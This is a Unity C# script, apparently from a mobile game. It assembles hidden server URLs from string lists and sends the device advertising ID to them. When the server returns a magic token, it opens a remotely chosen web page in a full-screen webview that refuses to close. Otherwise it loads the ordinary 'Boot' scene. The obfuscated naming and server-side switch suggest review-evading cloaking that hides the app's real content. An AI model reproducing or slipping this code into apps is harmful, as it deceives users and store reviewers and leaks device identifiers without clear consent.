using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using System;
using System.Collections;
using System.Collections.Generic;

public class MainPS : MonoBehaviour
{
    public List<string> splitters;
    public List<string> splitters1;
    public List<string> splitters2;
    [HideInInspector] public string odinPSn = "";
    [HideInInspector] public string dvaPSn = "";
    [HideInInspector] public string dvaPSn1 = "";
    [HideInInspector] public string dvaPSn2 = "";

    private Dictionary<string, object> exubPSs;
    private bool? _isexPS;
    private string _exPS;

    private bool PSLo = false;
    private bool PSLo2 = false;

    [SerializeField] private GameObject _PSbscr;
    [SerializeField] private RectTransform _PSprt;


    private Dictionary<string, object> shiftPSprinciple(string PSqueue)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();

        try
        {
            string processedPSqueue = PSqueue.Remove(0, 1);
            string[] pairs = processedPSqueue.Split('&');

            foreach (string pair in pairs)
            {                
                string[] splittedPSqueuPair = pair.Split("=");

                result.Add(splittedPSqueuPair[0], splittedPSqueuPair[1]);
            }
        }

        catch
        {
            return new Dictionary<string, object>();
        }

        return result;
    }

    private IEnumerator IENUMENATORPS(bool isexPS)
    {
        using (UnityWebRequest ps = UnityWebRequest.Get(dvaPSn))
        {
            yield return ps.SendWebRequest();

            if (ps.result == UnityWebRequest.Result.ProtocolError || ps.result == UnityWebRequest.Result.ConnectionError)
                MovePS();

            if (!isexPS && PlayerPrefs.GetString("SettinglPSallude", string.Empty) != string.Empty)
            {
                GRIDPSLOOK(PlayerPrefs.GetString("SettinglPSallude"));

                PSLo = true;

                yield break;
            }

            int entityPS = 7;

            while (PlayerPrefs.GetString("glrobo", "") == "" && entityPS > 0)
            {
                yield return new WaitForSeconds(1);
                entityPS--;
            }

            try
            {
                if (ps.result == UnityWebRequest.Result.Success)
                {
                    if (ps.downloadHandler.text.Contains("PlnstrsBDXywefvd"))
                    {
                        switch (isexPS)
                        {
                            case true:
                                string PSfin = ps.downloadHandler.text.Replace("\"", "");

                                PSfin += "/?";

                                try
                                {
                                    foreach (KeyValuePair<string, object> entry in exubPSs)
                                    {
                                        PSfin += entry.Key + "=" + entry.Value + "&";
                                    }

                                    PSfin = PSfin.Remove(PSfin.Length - 1);                                    

                                    GRIDPSLOOK(PSfin);

                                    PSLo = true;
                                }

                                catch
                                {
                                    goto case false;
                                }

                                break;

                            case false:
                                try
                                {
                                    var subscs = ps.downloadHandler.text.Split('|');
                                    PSfin = subscs[0] + "?idfa=" + odinPSn;

                                    PlayerPrefs.SetString("SettinglPSallude", PSfin);

                                    GRIDPSLOOK(PSfin, subscs[1]);

                                    PSLo = true;
                                }

                                catch
                                {
                                    PSfin = ps.downloadHandler.text + "?idfa=" + odinPSn;

                                    PlayerPrefs.SetString("SettinglPSallude", PSfin);

                                    GRIDPSLOOK(PSfin);

                                    PSLo = true;
                                }

                                break;
                        }
                    }

                    else
                        MovePS();
                }

                else
                    MovePS();
            }

            catch
            {
                MovePS();
            }
        }
    }



    private void FirstTimePSOpen()
    {
        if (PlayerPrefs.GetInt("FirstTimeOpening?", 1) == 1)
        {
            PlayerPrefs.SetInt("FirstTimeOpening", 0);

            string fullInstallPSEventEndpoint = dvaPSn2 + string.Format("?advertiser_tracking_id={0}", odinPSn);

            StartCoroutine(PSSECGE(fullInstallPSEventEndpoint));
        }
    }


    private void STARTIENUMENATORPS(bool isexPS) => StartCoroutine(IENUMENATORPS(isexPS));

    private void GRIDPSLOOK(string SettinglPSallude, string NamingPS = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);

        var _jointsPS = gameObject.AddComponent<UniWebView>();
        _jointsPS.ReferenceRectTransform = _PSprt;
        _jointsPS.SetToolbarDoneButtonText("");

        switch (NamingPS)
        {
            case "0":
                _jointsPS.SetShowToolbar(true, false, false, true);
                break;

            default:
                _jointsPS.SetShowToolbar(false);
                break;
        }

        _jointsPS.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);

        _jointsPS.OnShouldClose += (view) =>
        {
            return false;
        };

        _jointsPS.SetSupportMultipleWindows(true);
        _jointsPS.SetAllowBackForwardNavigationGestures(true);

        _jointsPS.OnMultipleWindowOpened += (view, windowId) =>
        {
            _jointsPS.SetShowToolbar(true);

        };

        _jointsPS.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingPS)
            {
                case "0":
                    _jointsPS.SetShowToolbar(true, false, false, true);
                    break;

                default:
                    _jointsPS.SetShowToolbar(false);
                    break;
            }
        };

        _jointsPS.OnOrientationChanged += (view, orientation) =>
        {
            _jointsPS.Frame = _PSprt.rect;
        };

        _jointsPS.OnPageFinished += (view, statusCode, url) =>
        {
            if (PSLo2 == false)
            {
                PSLo2 = true;

                _PSbscr.SetActive(true);

                _jointsPS.Show(true, UniWebViewTransitionEdge.Bottom, 0.4f);
            }

            if (PlayerPrefs.GetString("SettinglPSallude", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("SettinglPSallude", url);
            }
        };

        _jointsPS.Load(SettinglPSallude);
    }

    private void MovePS()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Boot");
    }

    private IEnumerator PSSECGE(string liPS)
    {
        using (UnityWebRequest request = UnityWebRequest.Get(liPS))
        {
            yield return request.SendWebRequest();

            try
            {
                if (request.result == UnityWebRequest.Result.Success)
                {
                    _exPS = request.downloadHandler.text.Replace("\"", "");

                    PlayerPrefs.SetString("Link", _exPS);
                }

                else if (request.result == UnityWebRequest.Result.ProtocolError || request.result == UnityWebRequest.Result.ConnectionError)
                {
                    throw new Exception("Error");
                }                

                exubPSs = shiftPSprinciple(new Uri(_exPS).Query);

                if (exubPSs == new Dictionary<string, object>())
                {
                    _isexPS = false;

                    STARTIENUMENATORPS(_isexPS.Value);
                }

                else
                {
                    _isexPS = true;

                    STARTIENUMENATORPS(_isexPS.Value);
                }
            }

            catch (Exception e)
            {
                Debug.Log(e.ToString());

                STARTIENUMENATORPS(false);
            }
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            StartCoroutine(CANTPSOP(10));

            foreach (string n in splitters)
                dvaPSn += n;

            foreach (string n in splitters1)
                dvaPSn1 += n;

            foreach (string n in splitters2)
                dvaPSn2 += n;

            StartCoroutine(PSSECGE(dvaPSn1 + string.Format("?advertiser_tracking_id={0}", odinPSn)));

            FirstTimePSOpen();
        }

        else
            MovePS();
    }

    private IEnumerator CANTPSOP(int tioc)
    {
        yield return new WaitForSeconds(tioc);

        if (PSLo)
            yield break;

        else
            STARTIENUMENATORPS(false);

        yield break;
    }

    private void Awake()
    {
        PlayerPrefs.SetString("SettinglPSallude", string.Empty);

        if (PlayerPrefs.GetInt("idfaPS") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinPSn = advertisingId; });
        }
    }

}


